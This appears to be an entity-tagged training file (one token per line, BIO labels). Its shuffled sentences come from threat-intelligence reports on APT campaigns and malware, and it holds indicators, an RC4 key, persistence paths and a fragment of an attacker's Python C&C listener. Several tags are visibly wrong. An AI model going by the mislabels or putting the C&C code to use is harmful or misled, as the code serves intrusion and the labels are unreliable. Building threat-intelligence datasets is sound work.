to	O
write	O
out	O
a	O
string	O
xor	O
'd	O
with	O
0x3d	O
as	O
an	O
executable	O
file	O
and	O
runs	O
it	O
.	O

The	O
attackers	O
have	O
been	O
active	O
for	O
more	O
than	O
ten	O
years	O
.	O

Figure	O
19	O
:	O
Country	O
Code	O
Check	O

The	O
authors	O
wish	O
to	O
thank	O
the	O
researchers	O
behind	O
Operation	O
Hangover	O
,	O
whose	O
work	O
we	O
depended	O
heavily	O
upon	O
:	O
Snorre	O
Fagerland	O
,	O
Morten	O
Kråkvik	O
,	O
Jonathan	O
Camp	O
,	O
and	O
Ned	O
Moran	O
.	O

0x31	B-Version
0x35	B-Version
0x35	B-Version
0x43	B-Version
0x41	B-Version
0x44	B-Version
0x33	B-Version
0x31	B-Version
0x41	B-Version
0x36	B-Version
0x31	B-Version
0x46	B-Version
0x01	B-Version
0x05	B-Version
0x05	B-Version
0x0C	B-Version
0x0A	B-Version
0x0D	B-Version
0x03	B-Version
0x01	B-Version
0x0A	B-Version
0x06	B-Version
0x01	B-Version
0x0F	B-Version
0x10	B-Version
0x10	B-Version
0x30	B-Version
0x50	B-Version
0xA0	B-Version
0xA0	B-Version
0x15	B-Version
0x5C	B-Version
0xAD	B-Version
0x31	B-Version
0xA6	B-Version
0x1F	B-Version

replaced	O
by	O
u.cacheoffer[.]tk	O
)	O
:	O

Surprisingly	O
,	O
one	O
sample	O
of	O
the	O
Equation	O
APT	B-Malware
campaign	O
(	O
fanny	O
worm	O
)	O
was	O
found	O
and	O
blocked	O
on	O
a	O
Cisco	O
AMP	O
customer	O
's	O
machine	O
a	O
day	O
after	O
the	O
public	O
release	O
of	O
the	O
Kaspersky	O
report	O
.	O

In	O
the	O
code	O
of	O
Python	O
script	O
,	O
attackers	O
left	O
their	O
comment	O
which	O
had	O
following	O
text	O
:	O

So	O
,	O
from	O
the	O
current	O
point	O
of	O
view	O
,	O
there	O
are	O
three	O
theories	O
:	O
The	O
attackers	O
who	O
developed	O
the	O
Kraken	B-Malware
malware	O
might	O
have	O
chosen	O
to	O
diversify	O
their	O
business	O
and	O
chose	O
to	O
attack	O
special	O
interest	O
targets	O
themselves	O
.	O

All	O
but	O
one	O
sample	O
that	O
we	O
identified	O
were	O
written	O
to	O
this	O
folder	O
as	O
word.exe	O
.	O

Unfortunately	O
,	O
when	O
we	O
started	O
this	O
investigation	O
,	O
the	O
domain	O
is	O
now	O
pointing	O
to	O
an	O
IP	O
address	O
of	O
Google	O
and	O
returning	O
a	O
404	O
Not	O
Found	O
page	O
only	O
.	O

Shane	O
,	O
Scott	O
.	O

All	O
other	O
brands	O
,	O
products	O
,	O
or	O
service	O
names	O
are	O
or	O
may	O
be	O
trademarks	O
or	O
service	O
marks	O
of	O
their	O
respective	O
owners	O
.	O

Take	O
steps	O
to	O
further	O
secure	O
Windows	B-System
systems	O
such	O
as	O
installing	O
and	O
configuring	O
Microsoft	B-Organization
's	O
Enhanced	O
Mitigation	O
Experience	O
Toolkit	O
(	O
EMET	O
)	O
and	O
Microsoft	O
AppLocker	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
macro	O
code	O
accessing	O
the	O
content	O
from	O
the	O
TextBox	O
and	O
the	O
error	O
triggered	O
by	O
the	O
code	O
due	O
to	O
the	O
absence	O
of	O
the	O
TextBox	O
content	O
.	O

In	O
all	O
CozyDuke	B-Malware
samples	O
from	O
2015	O
,	O
the	O
configuration	O
data	O
has	O
been	O
encrypted	O
with	O
the	O
RC4	O
key	O
B5	O
78	O
62	O
52	O
98	O
3E	O
24	O
D7	O
3B	O
C6	O
EE	O
7C	O
B9	O
ED	O
91	O
62	O
.	O

However	O
these	O
attacks	O
also	O
leverage	O
trusted	O
channels	O
into	O
the	O
eventual	O
target	O
,	O
e.g.	O
,	O
through	O
a	O
trusted	O
supplier	O
,	O
allowing	O
attackers	O
to	O
potentially	O
circumvent	O
security	O
systems	O
at	O
the	O
organization	O
they	O
ultimately	O
wish	O
to	O
compromise	O
.	O

The	O
downloaded	O
executable	O
is	O
saved	O
in	O
the	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

Network	O
based	O
indications	O
of	O
possible	O
compromise	O
by	O
the	O
comment	O
crew	O
attackers	O
.	O

Heavy	O
obfuscation	O
or	O
the	O
use	O
of	O
crypters	O
easily	O
raises	O
suspicion	O
of	O
heuristics	O
based	O
malware	O
scanners	O
.	O

Dark	O
Seoul	O
(	O
2013	O
)	O

Insikt	O
Group	O
analyzed	O
internet	O
traffic	O
relating	O
to	O
various	O
institutes	O
affiliated	O
with	O
the	O
Iranian	O
cyber	O
ecosystem	O
from	O
March	O
1	O
,	O
2018	O
to	O
April	O
30	O
,	O
2018	O
.	O

AIS	O
participants	O
connect	O
to	O
a	O
DHS-managed	O
system	O
in	O
the	O
NCCIC	O
that	O
allows	O
bidirectional	O
sharing	O
of	O
cyber	O
threat	O
indicators	O
.	O

And	O
second	O
is	O
'	O
philip.varilla	O
'	O
.	O

The	O
attackers	O
could	O
visit	O
websites	O
that	O
are	O
regarded	O
as	O
illegal	O
in	O
the	O
respective	O
country	O
and	O
could	O
then	O
ask	O
for	O
ransom	O
and	O
threaten	O
to	O
release	O
information	O
about	O
the	O
alleged	O
violation	O
to	O
any	O
seemingly	O
official	O
entity	O
who	O
would	O
then	O
investigate	O
against	O
the	O
victim	O
.	O

Exactly	O
the	O
same	O
method	O
was	O
used	O
in	O
the	O
WannaCryptor.D	O
ransomware	O
.	O

This	O
section	O
contains	O
the	O
details	O
of	O
the	O
C2	O
domain	O
(	O
khanji[.]ddns[.]net	B-Indicator
)	O
.	O

s.listen	O
(	O
1	O
)	O
29.	O
print	O
'	O
[	O
*	O
]	O
C	O
&	O
C	O
Running	O
on	O
0.0.0.0:443	O
'	O
32.	O
while	O
True	O
:	O
33.	O
s2	O
,	O
ca	O
=	O
s.accept	O
(	O
)	O
34.	O
print	O
'	O
[	O
+	O
]	O
New	O
client	O
connected	O
:	O
'	O
,	O
ca	O
36.	O
while	O
True	O
:	O
37.	O
dec	O
=	O
'	O
'	O
38.	O
rlist	O
,	O
wlist	O
,	O
xlist	O
=	O
select.select	O
(	O
[	O
s2	O
,	O
]	O
,	O
[	O
]	O
,	O
[	O
]	O
,	O
10	O
)	O
39.	O
while	O
rlist	O
:	O
40.	O
data	O
=	O
s2.recv	O
(	O
2048	O
)	O
41.	O
if	O
not	O
data	O
:	O
break	O
44.	O
dec	O
=	O
decode	O
(	O
data	O
)	O
45.	O
print	O
dec	O
46.	O
rlist	O
,	O
wlist	O
,	O
xlist	O
=	O
select.select	O
(	O
[	O
s2	O
,	O
]	O
,	O
[	O
]	O
,	O
[	O
]	O
,	O
2	O
)	O
49.	O
if	O
dec.startswith	O
(	O
'	O
$	O
login	O
$	O
'	O
)	O
:	O
50.	O
print	O
'	O
[	O
+	O
]	O
Authenticating	O
on	O
the	O
bot	O
'	O
51	O
.	O

The	O
following	O
factors	O
in	O
this	O
cyber	O
attack	O
suggests	O
the	O
possible	O
involvement	O
of	O
Pakistan	O
state	O
sponsored	O
cyber	O
espionage	O
group	O
to	O
mainly	O
spy	O
on	O
India	O
's	O
actions	O
related	O
to	O
these	O
Geo-political	O
events	O
(	O
Uri	O
terror	O
attack	O
and	O
Jammu	O
&	O
Kashmir	O
protests	O
)	O
.	O

C	O
&	O
C	O
:	O

This	O
malware	O
has	O
two	O
routines	O
that	O
we	O
could	O
find	O
no	O
other	O
purpose	O
than	O
for	O
such	O
an	O
evasion	O
.	O

An	O
interesting	O
feature	O
of	O
this	O
malware	O
is	O
that	O
it	O
has	O
components	O
to	O
wipe	O
out	O
harddisks	O
on	O
both	O
Windows	B-System
and	O
Linux	O
platforms	O
.	O

Based	O
on	O
its	O
code	O
,	O
this	O
malware	O
is	O
capable	O
of	O
executing	O
the	O
following	O
commands	O
from	O
the	O
hacker	O
:	O
·	O
Create	O
,	O
read	O
,	O
write	O
files	O
·	O
Download	O
and	O
execute	O
files/components	O
·	O
Launch	O
remote	O
shell	O
using	O
cmd.exe	O
While	O
other	O
APT	O
backdoors	O
have	O
more	O
capabilities	O
,	O
such	O
as	O
keylogging	O
,	O
taking	O
screen	O
shots	O
,	O
etc.	B-System
,	O
Hussarini	B-Malware
only	O
has	O
few	O
,	O
including	O
the	O
capability	O
to	O
download	O
and	O
execute	O
files/components	O
.	O

Data	O
:	O
Ups	O
?	O
?	O
?	O

Introduction	O
and	O
Prior	O
Research	O
........................................................................................................................................................................................................................................................	O
3	O

Table	O
2	O
.	O

A	O
strange	O
file	O
was	O
discovered	O
on	O
the	O
victim	O
's	O
computer	O
,	O
which	O
was	O
detected	O
by	O
our	O
antivirus	O
engine	O
as	O
Rootkit.Win32.Stuxnet.a	O
.	O

Additionally	O
,	O
the	O
application	O
was	O
initially	O
developed	O
by	O
a	O
member	O
of	O
the	O
Ukrainian	O
army	O
.	O

Malware	O
Package	O
6	O
.	O

Additionally	O
,	O
we	O
discovered	O
web	O
control	O
panels	O
for	O
several	O
different	O
commodity	O
RATs	O
located	O
under	O
directories	O
that	O
appeared	O
to	O
be	O
code-names	O
for	O
different	O
operations	O
(	O
Fig	O
11	O
)	O
.	O

1	O
20120426	B-Version
20130311	O
52284	O
200.63.46.0/24	B-Version
2	O
http://bgpranking.circl.lu	O
/asn_details	O
?	O
asn=52284	O
&	O
source=	O
&	O
date=	O

The	O
droppers	O
are	O
probably	O
attached	O
to	O
an	O
email	O
message	O
.	O

The	O
particular	O
version	O
we	O
analyzed	O
was	O
NewCT	B-System
version	O
2	O
.	O

The	O
site	O
was	O
up	O
and	O
active	O
as	O
late	O
as	O
22	O
July	O
,	O
2015	O
.	O

It	O
is	O
the	O
client	O
's	O
handshake	O
that	O
the	O
driver	O
for	O
the	O
server	O
variant	O
triggers	O
off	O
of	O
.	O

A	O
)	O
,	O
discovered	O
in	O
June	O
2017	O
,	O
that	O
uses	O
a	O
PowerShell	O
script	O
instead	O
of	O
its	O
more	O
traditional	O
PE	O
executable	O
form—a	O
version	O
that	O
other	O
researchers	O
also	O
recently	O
identified	O
.	O

With	O
a	O
standard	O
Snort	O
IDS	O
in	O
place	O
,	O
this	O
traffic	O
can	O
be	O
caught	O
with	O
relative	O
ease	O
.	O

Advanced	B-System
Malware	O
Protection	O
(	O
AMP	O
)	O
is	O
ideally	O
suited	O
to	O
prevent	B-Version
the	O
execution	O
of	O
the	O
malware	O
used	O
by	O
these	O
threat	O
actors	O
.	O

Figure	O
8	O
.	O

In	O
late	O
June	O
and	O
August	O
2016	O
,	O
CrowdStrike	O
Intelligence	O
provided	O
initial	O
reporting	O
and	O
technical	O
analysis	O
of	O
a	O
variant	O
of	O
the	O
FANCY	O
BEAR	O
implant	O
X-Agent	B-Malware
that	O
targeted	O
the	O
Android	O
mobile	O
platform	O
.	O

FACTORS	O

19	O
,	O
2018	O
,	O
2:56	O
p.m.	O
)	O
:	O
Decoy	O
Document	O
The	O
Word	O
document	O
,	O
which	O
includes	O
information	O
on	O
ADMM-Plus	O
members	O
,	O
has	O
a	O
malicious	O
executable	O
file	O
embedded	O
as	O
an	O
OLE	O
object	O
(	O
see	O
Exhibit	O
2	O
)	O
.	O

If	O
scada.exe	B-Malware
finds	O
a	O
matching	O
DLL	O
file	O
name	O
,	O
it	O
kills	O
all	O
running	O
processes	O
with	O
the	O
name	O
biogas.exe	O
.	O

?	O
1	O
?	O
0	O
ff	O
15	O
?	O
?	O

For	O
example	O
,	O
many	O
in	O
the	O
Syrian	O
opposition	O
are	O
now	O
aware	O
of	O
the	O
electronic	O
threats	O
they	O
face	O
and	O
seek	O
out	O
tools	O
to	O
increase	O
their	O
communications	O
security	O
and	O
privacy	O
.	O

Mandiant	B-Organization
confirmed	O
that	O
,	O
after	O
correcting	O
patching	O
the	O
attack	O
script	O
to	O
remove	O
this	O
check	O
,	O
the	O
payload	O
binary	O
would	O
persist	O
in	O
controller	O
memory	O
,	O
and	O
the	O
controller	O
would	O
continue	O
to	O
run	O
.	O

29	O
Dec	O
.	O

According	O
to	O
various	O
sources	O
,	O
there	O
are	O
estimates	O
suggesting	O
that	O
,	O
in	O
greater	O
Crimea	O
80	O
%	O
speak	O
Russian	O
,	O
10	O
%	O
speak	O
Ukrainian	O
,	O
and	O
10	O
%	O
speak	O
Tatar	O
.	O

It	O
's	O
interesting	O
that	O
the	O
same	O
'	O
rsh	O
!	O

Organizations	O
can	O
implement	O
various	O
techniques	O
and	O
best	O
practices	O
to	O
defend	O
against	O
targeted	O
attacks	O
,	O
such	O
as	O
regular	O
patching	O
to	O
prevent	O
vulnerability	O
exploitation	O
and	O
using	O
tools	O
that	O
provide	O
protection	O
across	O
different	O
network	O
levels	O
.	O

The	O
cache	O
filename	O
will	O
be	O
retrieved	O
and	O
opened	O
to	O
retrieve	O
the	O
payload	O
from	O
the	O
C	O
&	O
C	O
server	O
.	O

In	O
this	O
APT	O
,	O
the	O
threat	O
actor	O
was	O
very	O
aware	O
of	O
the	O
risks	O
of	O
exposure	O
and	O
tried	O
to	O
combat	O
attribution	O
as	O
much	O
as	O
possible	O
.	O

Payment	O
Invoice.jar	O

Dubbed	O
Operation	O
Cobalt	O
Kitty	O
,	O
the	O
APT	O
targeted	O

Those	O
strings	O
helped	O
us	O
find	O
other	O
websites	O
that	O
use	O
the	O
same	O
template	O
,	O
and	O
while	O
they	O
could	O
not	O
be	O
linked	O
to	O
specific	O
malware	O
samples	O
,	O
it	O
is	O
possible	O
that	O
they	O
will	O
be	O
used	O
in	O
the	O
future	O
.	O

7	O
)	O
,	O
the	O
extra	O
field	O
begins	O
at	O
offset	O
of	O
the	O
file	O
header	O
for	O
a	O
given	O
file	O
in	O
the	O
compressed	O
JAR	O
.	O

In	O
2010	O
,	O
the	O
authors	O
created	O
the	O
second	O
driver	O
mrxnet.sys	O
(	O
to	O
hide	O
the	O
worm	O
's	O
component	O
files	O
on	O
USB	O
drives	O
)	O
and	O
equipped	O
mrxnet.sys	O
and	O
mrxcls.sys	O
drivers	O
with	O
digital	O
certificates	O
from	O
Realtek	O
.	O

The	O
group	O
includes	O
members	O
who	O
are	O
fluent	O
in	O
at	O
least	O
two	O
Asian	O
languages	O
.	O

SQLite.exe	O
to	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
as	O
shown	O
below	O
.	O

The	O
process	O
chain	O
is	O
shown	O
in	O
Figure	O
2	O
.	O

10:27	O
am	O
During	O
the	O
latter	O
part	O
of	O
2015	O
,	O
Kaspersky	O
researchers	O
from	O
GReAT	O
(	O
Global	O
Research	O
and	O
Analysis	O
Team	O
)	O
got	O
hold	O
of	O
the	O
missing	O
pieces	O
of	O
an	O
intricate	O
puzzle	O
that	O
points	O
to	O
the	O
dawn	O
of	O
the	O
first	O
Portuguese­speaking	O
targeted	O
attack	O
group	O
,	O
named	O
'	O
Poseidon	B-Malware
.	O
'	O

This	O
uses	O
an	O
interesting	O
bug	O
in	O
the	O
Windows	B-System
DDE	O
component	O
.	O

was	O
executed	O
with	O
krv	O
as	O
the	O
first	O
parameter	O
.	O

Adobe	B-Organization
acted	O
quickly	O
to	O
coordinate	O
with	O
ICEBRG	O
,	O
reproduce	O
the	O
vulnerability	O
,	O
and	O
distribute	O
a	O
patch	O
for	O
its	O
software	O
on	O
June	O
7	O
,	O
2018	O
.	O

Samples	O
#	O
2-4	O
were	O
also	O
separately	O
uploaded	O
by	O
users	O
in	O
Taiwan	O
and	O
the	O
US	O
on	O
the	O
dates	O
given	O
above	O
.	O

Some	O
of	O
the	O
targets	O
are	O
diplomatic	O
or	O
have	O
strategic	O
commercial	O
interests	O
.	O

FireEye	B-System
has	O
invented	O
a	O
purpose-built	O
,	O
virtual	O
machine-based	O
security	O
platform	O
that	O
provides	O
realtime	O
threat	O
protection	O
to	O
enterprises	O
and	O
governments	O
worldwide	O
against	O
the	O
next	O
generation	O
of	O
cyber	O
attacks	O
.	O

After	O
the	O
raw	O
source	O
buffer	O
has	O
been	O
converted	O
from	O
ASCII	O
form	O
to	O
integer	O
form	O
,	O
the	O
next	O
substantive	O
code	O
block	O
initializes	O
a	O
256-element	O
array	O
stable_var_41C	O
:	O

There	O
is	O
no	O
clue	O
on	O
the	O
functionality	O
of	O
purpose	O
of	O
the	O
binary	O
by	O
just	O
looking	O
at	O
the	O
string	O
's	O
table	O
.	O

漏洞分析	O
(	O
38	O
)	O

OS	O
version	O

0-day	B-Version
exploits	O
are	O
written	O
to	O
exploit	O
vulnerabilities	O
that	O
have	O
not	O
been	O
disclosed	O
to	O
the	O
public	O
nor	O
the	O
concerned	O
software	O
vendor	O
.	O

Due	O
to	O
expensive	O
work	O
of	O
malware	O
with	O
variety	O
of	O
additional	O
files	O
,	O
it	O
's	O
not	O
out	O
of	O
place	O
to	O
show	O
these	O
'	O
relationships	O
'	O
in	O
a	O
diagram	O
:	O
This	O
module	O
intercepts	O
HWP	O
documents	O
on	O
an	O
infected	O
computer	O
.	O

The	O
malware	O
supports	O
up	O
to	O
8	O
different	O
modules	O
per	O
sample	O
with	O
each	O
module	O
designating	O
its	O
own	O
ID	O
code	O
.	O

The	O
first	O
resource	O
,	O
0x000A	O
,	O
contains	O
as	O
its	O
payload	O
a	B-Organization
Microsoft	O
cabinet	O
archive	O
.	O

Failed	O
exploit	O
attempts	O
may	O
result	O
in	O
an	O
application	O
crash	O
(	O
denial	O
of	O
service	O
)	O
.	O

MP4	O
video	O
contained	O
in	O
EXE	O
file	O
2AAD951DBECB6D4715B306B337CA5C34	B-Indicator

Table	B-Malware
1	O
CVE­2011­0611	O
CVE­2012­0158	O
CVE­2009­0927	O
CVE­2010­3333	O
CVE­2012­0754	O
malware	O
uses	O
a	O
well­documented	O
vulnerability	O
in	O
the	O
Windows	B-System
OS	O
known	O
as	O
DLL	O
search	O
order	O
hijacking	O
.	O

Figure	O
4	O
:	O
Code	O
snippet	O
that	O
is	O
linked	O
from	O
OpenSSL	O
library	O
Figure	O
5	O
:	O
Op	O
code	O
in	O
the	O
instructions	O
Figure	O
7	O
:	O
OpenSSL	B-Indicator
functions	O

If	O
any	O
of	O
the	O
instances	O
dies	O
,	O
a	O
new	O
third	O
instance	O
will	O
be	O
created	O
.	O

Companies	O
selling	O
surveillance	O
and	O
intrusion	O
software	O
commonly	O
claim	O
that	O
their	O
tools	O
are	O
only	O
used	O
to	O
track	O
criminals	O
and	O
terrorists	O
.	O

The	O
first	O
actor	O
group	O
,	O
known	O
as	O
Advanced	O
Persistent	O
Threat	O
(	O
APT	O
)	O
29	O
,	O
entered	O
into	O
the	O
party	O
's	O
systems	O
in	O
summer	O
2015	O
,	O
while	O
the	O
second	O
,	O
known	O
as	O
APT28	B-Malware
,	O
entered	O
in	O
spring	O
2016	O
.	O

Mystery	O
Cluster	O
3	O
(	O
aka	O
Cluster	O
3	O
,	O
centered	O
on	O
qoog1e[.]com	B-Indicator
)	O
:	O

This	O
post	O
was	O
authored	O
by	O
Andrea	O
Allievi	O
,	O
Douglas	O
Goddard	O
,	O
Shaun	O
Hurley	O
,	O
and	O
Alain	O
Zidouemba	O
.	O

The	O
initial	O
dropper	O
is	O
merely	O
a	O
detonation	O
package	O
that	O
decompresses	O
an	O
embedded	O
DLL	O
into	O
the	O
Windows	B-System
system32	O

function	O
.	O

Based	O
on	O
analysis	O
of	O
previous	B-Version
samples	O
,	O
this	O
is	O
a	O
unique	O
identifier	O
.	O

All	O
this	O
data	O
is	O
merged	O
in	O
one	O
file	O
xmlrwbin.inc	B-Version
,	O
which	O
is	O
then	O
encrypted	O
with	O
RC4	O
.	O

Once	O
loaded	O
as	O
a	O
service	O
DLL	O
,	O
the	O
DLL	O
's	O
export	O
ServiceMain	O
(	O
)	O
is	O
called	O
.	O

Both	O
sample	O
#	O
4	O
and	O
#	O
6	O
have	O
the	O
same	O
time	O
stamp	O
:	O
20	O
February	O
2017	O
,	O
11:09:30	O
.	O

Implementing	O
the	O
use	O
of	O
free	O
dynamic	O
DNS	O
services	O
,	O
such	O
as	O
those	O
of	O
NO-IP	O
within	O
targeting	O
and	O
exploitation	O
phases	O
of	O
attack	O
,	O
are	O
very	O
common	O
techniques	O
used	O
by	O
a	O
variety	O
sophisticated	O
threat	O
groups	O
.	O

This	O
suggested	O
the	O
attacker	O
had	O
already	O
compromised	O
other	O
systems	O
in	O
the	O
environment	O
and	O
was	O
using	O
an	O
internal	O
C2	O
mechanism	O
for	O
a	O
fallback	O
.	O

Following	O
the	O
first	O
five	O
bytes	O
,	O
the	O
packet	O
then	O
shows	O
the	O
full	O
packet	O
size	O
and	O
the	O
uncompressed	O
data	O
size	O
.	O

Public	O
and	O
private	O
sectors	O
alike	O
should	O
begin	O
to	O
increase	O
their	O
awareness	O
of	O
emerging	O
cyber	O
threats	O
from	O
the	O
lesser-known	O
middle	O
powers	O
.	O

It	O
also	O
provides	O
visibility	O
to	O
network-wide	O
security	O
events	O
.	O

However	O
,	O
more	O
significant	O
changes	O
can	O
be	O
found	O
in	O
several	O
functions	O
:	O
1	O
.	O

Since	O
it	O
is	O
operating	O
on	O
the	O
8-bit	O
register	O
AL	O
,	O
the	O
result	O
is	O
that	O
source	O
bytes	O
with	O
values	O
of	O
0x3A	O
or	O
greater	O
will	O
be	O
processed	O
by	O
one	O
branch	O
,	O
and	O
those	O
with	O
values	O
of	O
0x39	O
and	O
less	O
will	O
be	O
processed	O
by	O
a	O
second	O
branch	O
:	O

This	O
command	O
was	O
implemented	O
by	O
Microsoft	B-Organization
in	O
Windows	B-System
Vista	O
in	O
2007	B-Version
.	O

-	O
downloads	O
a	O
file	O
#	O
runfile-	O
-	O
executes	O
a	O
file	O
on	O
the	O
system	O
via	O
CreateProcess	O
API	O
#	O
urldownload	O
?	O

Command	O
code	O
Description	O

This	O
has	O
been	O
noted	O
by	O
others	O
in	O
the	O
community	O
as	O
well	O
,	O
specifically	O
that	O
Administrator	O
access	O
is	O
needed	O
for	O
initially	O
launching	O
Shamoon	B-Malware
.	O

It	O
parses	O
the	O
messages	O
,	O
looking	O
for	O
strings	O
defined	O
in	O
gpca.dat	O
.	O

executeShellCommand	O
:	O
]	O

FileTokenBroker.dll	O
is	O
a	O
DLL	O
,	O
installed	O
as	O
a	O
service	O
under	O
the	O
svchost.exe	O
(	O
netsvcs	O
)	O
service	O
host	O
.	O

Each	O
byte	O
of	O
the	O
key	O
is	O
generated	O
using	O
the	O
rand	O
function	O
.	O

His	O
dynamic	O
DNS	O
service	O
hosts	O
over	O
1	O
million	O
domain	O
names	O
.	O

A	O
full	O
technical	O
report	O
,	O
IoCs	O
and	O
YARA	O
rules	O
are	O
available	O
from	O
our	O
intelligence	O
reporting	O
service	O
(	O
contact	O
us	O
intelligence@kaspersky.com	O
)	O
.	O

During	O
the	O
incident	O
,	O
some	O
SIS	O
controllers	O
entered	O
a	O
failed	O
safe	O
state	O
,	O
which	O
automatically	O
shutdown	O
the	O
industrial	O
process	O
and	O
prompted	O
the	O
asset	O
owner	O
to	O
initiate	O
an	O
investigation	O
.	O

As	O
the	O
project	O
name	O
'	O
Babar64	B-Malware
'	O
suggests	O
,	O
dropper	O
and	O
implant	O
are	O
designed	O
to	O
work	O
on	O
32-bit	O
and	O
on	O
64-bit	O
Windows	O
versions	O
.	O

In	O
addition	O
,	O
a	O
custom	O
Python	O
script	O
named	O
ftpChecker.py	O
was	O
found	O
on	O
one	O
of	O
the	O
servers	O
.	O

This	O
is	O
a	O
publicly	O
available	O
RAT	O
used	O
by	O
multiple	O
threat	O
actors	O
,	O
which	O
has	O
been	O
extensively	O
analyzed	O
in	O
a	O
previous	O
FireEye	O
white	O
paper	O
12	O
.	O

However	O
,	O
the	O
selection	O
is	O
n't	O
frequently	O
seen	O
.	O

Since	O
then	O
we	O
have	O
encountered	O
24	O
additional	O
sites	O
compromised	O
with	O
the	O
framework	O
.	O

It	O
receives	O
a	O
base64	O
encoded	O
cmdPacket	O
that	O
has	O
previously	B-Version
been	O
encrypted	O
with	O
RC4	O
using	O
a	O
hardcoded	O
KERNEL_CRYPTO_MAIN_KEY	O
.	O

Communication	O
is	O
encrypted	O
over	O
HTTP	O
,	O
port	O
443	O
,	O
obfuscated	O
with	O
a	O
weak	O
encryption	O
scheme	O
.	O

Targeted	O
attacks	O
discovered	O
by	O
region	O

Figure	O
6	O
–	O
Information	O
about	O
Tor	O
relay	O
run	O
by	O
the	O
TeleBots	O
group	O
.	O

A	O
pop-up	O
appears	O
when	O
the	O
attacker	O
pushes	O
a	O
new	O
app	O
to	O
the	O
user	O
device	O
.	O

A	O
tangled	O
web	O
of	O
malware	O

One	O
final	O
note	O
regarding	O
the	O
encryption	O
key	O
strings	O
used	O
by	O
DarkComet	B-Malware
:	O
as	O
first	O
documented	O
in	O
Contextis	O
'	O
Laura	O
Aylward	O
's	B-System
DarkComet	B-Malware
analysis	O
,	O
each	O
version	O
of	O
DarkComet	B-Malware
uses	O
a	O
different	O
hard-coded	O
string	O
for	O
the	O
key	B-Version
prefix	O
.	O

Replacing	O
this	O
infrastructure	O
in	O
48	O
hours	O
suggests	O
that	O
the	O
threat	O
actors	O
were	O
prepared	O
for	O
such	O
a	O
scenario	O
.	O

The	O
mainLoop	B-Indicator
function	O
begins	O
by	O
loading	O
the	O
unique	O
infection	O
ID	O
for	O
the	O
victim	O
's	O
machine	O
from	O
the	O
registry	O
(	O
under	O
the	O
key	O
value	O
located	O
at	O
HKLM\SOFTWARE\Microsoft\Rpc\Security	O
)	O
.	O

s2.close	O
(	O
)	O
63	O
.	O

Figure	O
20	O
:	O
Fiddler	O
mutex	O
check	O

In	O
the	O
past	O
two	O
weeks	O
,	O
we	O
have	O
observed	O
an	O
increase	O
in	O
attack	O
activity	O
against	O
the	O
U.S.	O
state	O
and	O
local	O
government	O
,	O
technology	O
,	O
advisory	O
services	O
,	O
health	O
,	O
and	O
financial	O
sectors	O
through	O
phishing	O
emails	O
with	O
what	O
appears	O
to	O
be	O
a	O
remote	O
access	O
trojan	O
(	O
RAT	B-Malware
)	O
known	O
as	O
Unrecom	B-Malware
.	O

APT28	B-System
has	O
a	O
rich	O
arsenal	O
composed	O
of	O
a	O
large	O
number	O
of	O
modular	O
threats	O
and	O
the	O
dll	B-Malware
is	O
the	O
component	O
of	O
the	O
X-Agent	B-Malware
we	O
analyzed	O
.	O

Since	O
its	O
debut	O
,	O
this	O
malware	O
has	O
been	O
targeting	O
important	O
institutions	O
,	O
mainly	O
in	O
Asia	O
and	O
the	O
USA	O
,	O
the	O
victims	O
being	O
part	O
of	O
Government	O
sector	O
,	O
Technology	O
,	O
Education	O
and	O
Telecommunications	O
.	O

By	O
default	O
,	O
the	O
XtremeRAT	B-Malware
controller	O
sets	O
the	O
ID	O
field	O
as	O
'	O
Server	O
'	O
and	O
Group	O
field	O
as	O
'	O
Servers	O
'	O
,	O
with	O
the	O
default	O
password	O
used	O
to	O
authenticate	O
,	O
connect	O
,	O
and	O
control	O
a	O
compromised	O
endpoint	O
as	O
'	O
1234567890	O
'	O
.	O

In	O
both	O
cases	O
,	O
we	O
did	O
not	O
send	O
any	O
information	O
to	O
the	O
attackers	O
.	O

Impacket	B-System
—	O
a	O
toolset	O
for	O
working	O
with	O
various	O
network	O
protocols	O
,	O
which	O
is	O
required	O
by	O
SMBT	O
rap	O
.	O

Due	O
to	O
this	O
it	O
was	O
possible	O
to	O
make	O
a	O
complete	O
recovery	O
of	O
Shamoon-infected	B-Malware
file	O
systems	O
to	O
the	O
state	O
they	O
were	O
in	O
before	O
the	O
wiping	O
made	O
the	O
OS	O
unbootable	O
and	O
unreadable	O
.	O

(	O
Flash	B-System
Vulnerability	O
CVE-2016-7855	O
and	O
Windows	B-System
Vulnerability	O
CVE-2016-7255	O
were	O
exploited	O
as	O
zero	O
days	O
to	O
install	O
malware	O
on	O
victims	O
who	O
visited	O
a	O
malicious	O
URL	O
)	O
.	O

Exploit	O
:	O

This	O
integer	O
is	O
passed	O
to	O
a	O
standard	O
integer-to-string	O
API	O
,	O
which	O
writes	O
the	O
string	O
890	O
into	O
the	O
output	O
buffer	O
.	O

2017	O
.	O

Persistence	O
is	O
achieved	O
using	O
the	O
Run	O
Registry	O
key	O
with	O
the	O
value	O
name	O
IAStorD	O
:	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD	O
As	O
mentioned	O
earlier	O
,	O
two	O
hidden	O
DLLs	O
can	O
be	O
discovered	O
that	O
are	O
additionally	O
injected	O
into	O
iexplore.exe	O
and	O
have	O
the	O
export	O
functions	O
named	O
DePatchEntry	O
or	O
EvilEntry	O
.	O

Recently	O
,	O
ANTIY	O
Labs	O
detected	O
an	O
APT	O
attack	O
targeting	O
some	O
government	O
agency	O
in	O
China	O
.	O

The	O
digital	O
certificate	O
for	O
Blik	O
used	O
in	O
this	O
case	O
is	O
not	O
the	O
only	O
link	O
between	O
Win32/Spy.Agent.ORM	B-Malware
and	O
Win32/Spy.Sekur	O
(	O
Carbanak	B-Malware
malware	O
)	O
.	O

DllMain	O
performs	O
the	O
initialization	O
of	O
ZxShell	B-Malware
.	O

Cyberkov	O
Co	O
.	O

We	O
managed	O
to	O
get	O
a	O
copy	O
of	O
the	O
file	O
,	O
and	O
we	O
were	O
amazed	O
to	O
find	O
that	O
it	O
used	O
the	O
same	O
Realtek	O
certificate	O
,	O
but	O
with	O
a	O
different	O
file	O
signing	O
date	O
from	O
mrxcls.sys	O
:	O
rtniczw.sys	O
was	O
signed	O
on	O
18	O
March	O
2010	O
,	O
while	O
the	O
mrxcls	O
driver	O
had	O
been	O
signed	O
on	O
25	O
January	O
of	O
the	O
same	O
year	O
.	O

Then	O
it	O
expects	O
a	O
command	O
in	O
response	O
from	O
the	O
Command	O
&	O
